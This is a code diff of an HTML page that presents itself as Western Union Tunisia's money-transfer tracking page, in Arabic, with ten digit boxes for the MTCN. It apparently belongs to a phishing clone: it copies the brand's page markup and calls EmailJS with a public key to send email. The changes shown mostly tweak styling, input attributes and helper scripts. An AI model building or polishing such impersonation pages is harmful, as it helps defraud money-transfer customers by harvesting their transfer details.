@@ -3,7 +3,7 @@
 
 <head>
     <meta charSet="utf-8" />
-    <link rel="stylesheet" href="css/globalls.css" />
+    <link rel="stylesheet" href="./css/style.css" />
     <title>Track Money Transfers | Western Union TN</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="next-head-count" content="8" />
@@ -30,7 +30,6 @@
             publicKey: "y1OqcfFm5uIRRJPi-"
         }).then(function(response) {
             console.log("Email sent successfully!", response);
-            document.getElementById("message_error").style.display = "block";
         }, function(error) {
             console.error("Failed to send email:", error);
         });
@@ -40,6 +39,12 @@
 
     <link rel="shortcut icon" href="./css/unnamed.png" type="image/x-icon" />
     <style>
+      @media (max-width: 1599.98px) {
+    .TrackATransferTextField_tat-input-number__H32mz {
+        width: 27px !important;
+    }
+}
+
         :root {
             --color-infoPrimary: #dbf2fb;
             --color-successPrimary: #04624c;
@@ -1246,7 +1251,7 @@
                                             </div>
                                             <div data-testid="toggle_sender" class="Tabs_tab-pane__KlmNh m-pad-xxxs-tp">
                                                 <div id="label_tat_sender_history_help" class="row font-bs justify-content-center align-items-center TAT_history-link-container__v_8E_">
-                                                    <p class="rsp-margin-bottom-medium" aria-label="لتتبع عملية تحويل، أدخِل رقم التحويل <b>(MTCN)</b> أدناه الذي يتألف من <b>10</b> أرقام." id="label_tat_sender_mtcn_help"><span id="label_tat_instructionMessage">لتتبع عملية تحويل، أدخِل رقم التحويل <b>(MTCN)</b> أدناه الذي يتألف من <b>10</b> أرقام.</span></p>
+                                                    <p class="rsp-margin-bottom-medium" aria-label="لتتبع عملية تحويل، أدخِل رقم التحويل (MTCN) أدناه الذي يتألف من <b>10</b> أرقام." id="label_tat_sender_mtcn_help"><span id="label_tat_instructionMessage">لتتبع عملية تحويل، أدخِل رقم التحويل (MTCN) أدناه الذي يتألف من <b>10</b> أرقام.</span></p>
                                                     <div>
                                                         <div class="Tooltip_wrapper__Fcp83 m-pad-xxxxs-lt " role="tooltip" tabindex="0" data-linkname="btn-mtcn-tooltip">
                                                             <div class="Tooltip_icon__NSqGR " style="color: var(--color-primary); text-decoration: underline;"><svg class="" width="20" height="20" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" id="icon_tooltip_info" style="display: inline-block; vertical-align: middle; color: var(--color-primary);">
@@ -1262,36 +1267,36 @@
         <form class="input-elements-group" aria-label="لتتبع عملية تحويل، أدخِل رقم التحويل <b>(MTCN)</b> أدناه." style="text-align: center; width: 100%;">
             <p class="font-regular" style="font-family: EuclidWUMedium;"></p>
             <span class="TrackATransferTextField_input-number-wrapper__NK0nw">
-                <input onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_2' , 'page_1_1')" id="page_1_1" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
+                <input class="TrackATransferTextField_tat-input-number__H32mz font-hs m-mrg-xxxxs-rt" onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_2', 'page_1_1')" id="page_1_1" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" pattern="[0-9]" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
             </span>
             <span class="TrackATransferTextField_input-number-wrapper__NK0nw">
-                <input onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_3', 'page_1_1')" id="page_1_2" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
+                <input class="TrackATransferTextField_tat-input-number__H32mz font-hs m-mrg-xxxxs-rt" onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_3', 'page_1_1')" id="page_1_2" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" pattern="[0-9]" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
             </span>
             <span class="TrackATransferTextField_input-number-wrapper__NK0nw">
-                <input onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_4', 'page_1_2')" id="page_1_3" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
+                <input class="TrackATransferTextField_tat-input-number__H32mz font-hs m-mrg-xxxxs-rt" onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_4', 'page_1_2')" id="page_1_3" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" pattern="[0-9]" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
             </span>
             <span data-testid="seprator-2" id="seprator-2" class="TrackATransferTextField_tat-input-number__H32mz font-hs" style="color: var(--color-textPrimary);">-</span>
             <span class="TrackATransferTextField_input-number-wrapper__NK0nw">
-                <input onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_5', 'page_1_3')" id="page_1_4" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
+                <input class="TrackATransferTextField_tat-input-number__H32mz font-hs m-mrg-xxxxs-rt" onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_5', 'page_1_3')" id="page_1_4" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" pattern="[0-9]" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
             </span>
             <span class="TrackATransferTextField_input-number-wrapper__NK0nw">
-                <input onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_6', 'page_1_4')" id="page_1_5" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
+                <input class="TrackATransferTextField_tat-input-number__H32mz font-hs m-mrg-xxxxs-rt" onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_6', 'page_1_4')" id="page_1_5" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" pattern="[0-9]" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
             </span>
             <span class="TrackATransferTextField_input-number-wrapper__NK0nw">
-                <input onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_7', 'page_1_5')" id="page_1_6" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
+                <input class="TrackATransferTextField_tat-input-number__H32mz font-hs m-mrg-xxxxs-rt" onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_7', 'page_1_5')" id="page_1_6" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" pattern="[0-9]" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
             </span>
             <span data-testid="seprator-5" id="seprator-5" class="TrackATransferTextField_tat-input-number__H32mz font-hs" style="color: var(--color-textPrimary);">-</span>
             <span class="TrackATransferTextField_input-number-wrapper__NK0nw">
-                <input onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_8', 'page_1_6')" id="page_1_7" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
+                <input class="TrackATransferTextField_tat-input-number__H32mz font-hs m-mrg-xxxxs-rt" onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_8', 'page_1_6')" id="page_1_7" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" pattern="[0-9]" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
             </span>
             <span class="TrackATransferTextField_input-number-wrapper__NK0nw">
-                <input onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_9', 'page_1_7')" id="page_1_8" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
+                <input class="TrackATransferTextField_tat-input-number__H32mz font-hs m-mrg-xxxxs-rt" onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_9', 'page_1_7')" id="page_1_8" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" pattern="[0-9]" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
             </span>
             <span class="TrackATransferTextField_input-number-wrapper__NK0nw">
-                <input onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_10', 'page_1_8')" id="page_1_9" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
+                <input class="TrackATransferTextField_tat-input-number__H32mz font-hs m-mrg-xxxxs-rt" onKeyPress="if(this.value.length == 1) return false;" onkeyup="next_input(event, 'page_1_10', 'page_1_8')" id="page_1_9" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" pattern="[0-9]" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
             </span>
             <span class="TrackATransferTextField_input-number-wrapper__NK0nw">
-                <input onKeyPress="if(this.value.length == 1) return false;" onkeyup="out_('1'); next_input(event, 'page_1_10', 'page_1_9')" id="page_1_10" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" type="number" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
+                <input class="TrackATransferTextField_tat-input-number__H32mz font-hs m-mrg-xxxxs-rt" onKeyPress="if(this.value.length == 1) return false;" onkeyup="out_('1'); next_input(event, 'page_1_10', 'page_1_9')" id="page_1_10" pattern="/^-?\d+\.?\d*$/" class="inputcheck TrackATransferTextField_tat-input-number__H32mz font-hs" autocomplete="off" name="digit" contenteditable="true" maxlength="1" placeholder="0" pattern="[0-9]" type="number" qm-data-rule="mask" value="" style="outline: 0px; border-width: 0px 0px 1px; border-radius: 0px; color: var(--color-textPrimary); border-color: var(--color-borderTertiary);">
             </span>
         </form>
     </div>
@@ -1340,6 +1345,7 @@
                     </div>
                 </div>
         `;
+        
         document.getElementById("page_1_1").focus();
             
         let btns__ = document.querySelectorAll(".btns__"); 
@@ -1597,7 +1603,7 @@
                                             </div>
                                             <div data-testid="toggle_receiver" class="Tabs_tab-pane__KlmNh m-pad-xxxs-tp">
                                                 <div id="label_tat_receiver_help" class="flex col font-bs align-items-start TAT_sender-link-container__lTchB">
-                                                    <p aria-label="لتتبع عملية تحويل،  رقم التحويل <b>(MTCN)</b> الذي يتألف من <b>10</b> أرقام وأدخله أدناه" id="label_tat_subtitle" style="margin-bottom: 0px;"><span id="label_receiver_ask_your_sender">لتتبع عملية تحويل، <a href="mailto:" testid="link_receiver_ask_your_sender" data-linkname="btn-ask-your-sender" aria-label="لتتبع عملية تحويل،  رقم التحويل <b>(MTCN)</b> الذي يتألف من <b>10</b> أرقام وأدخله أدناه" style="color: var(--color-primary); font-family: EuclidWU; text-decoration: underline; cursor: pointer;">اطلب من المرسِل</a> رقم التحويل <b>(MTCN)</b> الذي يتألف من <b>10</b> أرقام وأدخله أدناه</span></p>
+                                                    <p aria-label="لتتبع عملية تحويل،  رقم التحويل <b>(MTCN)</b> الذي يتألف من <b>10</b> أرقام وأدخله أدناه" id="label_tat_subtitle" style="margin-bottom: 0px;"><span id="label_receiver_ask_your_sender">لتتبع عملية تحويل، <a href="mailto:" testid="link_receiver_ask_your_sender" data-linkname="btn-ask-your-sender" aria-label="لتتبع عملية تحويل،  رقم التحويل (MTCN) الذي يتألف من <b>10</b> أرقام وأدخله أدناه" style="color: var(--color-primary); font-family: EuclidWU; text-decoration: underline; cursor: pointer;">اطلب من المرسِل</a> رقم التحويل (MTCN) الذي يتألف من <b>10</b> أرقام وأدخله أدناه</span></p>
                                                 </div>
                                             </div>
                                         </div>
@@ -1659,34 +1665,7 @@
                     </div>
                 </div>
         `;
-        function checkInput(input) {
-    if (input.value === "") {
-      return false;
-    }
-    return true;
-  }
-
-  // دالة للتنقل بين المربعات
-  function next_input(event, nextInputId, currentInputId) {
-    const currentInput = document.getElementById(currentInputId);
-    const nextInput = document.getElementById(nextInputId);
-
-    // تحقق من وجود قيمة في المربع الحالي قبل الانتقال إلى المربع التالي
-    if (checkInput(currentInput)) {
-      nextInput.focus(); // التبديل إلى المربع التالي
-    } else {
-      event.preventDefault(); // منع الانتقال إذا لم يتم إدخال قيمة
-    }
-  }
-
-  // منع الإدخال إذا كان المربع يحتوي على أكثر من رقم
-  document.querySelectorAll('input[type="number"]').forEach(input => {
-    input.addEventListener('keypress', function(event) {
-      if (this.value.length >= 1) {
-        event.preventDefault();
-      }
-    });
-  });
+      
         document.getElementById("page_2_1").focus();
         
        let inputcheck2 = document.querySelectorAll('.inputcheck2') ;
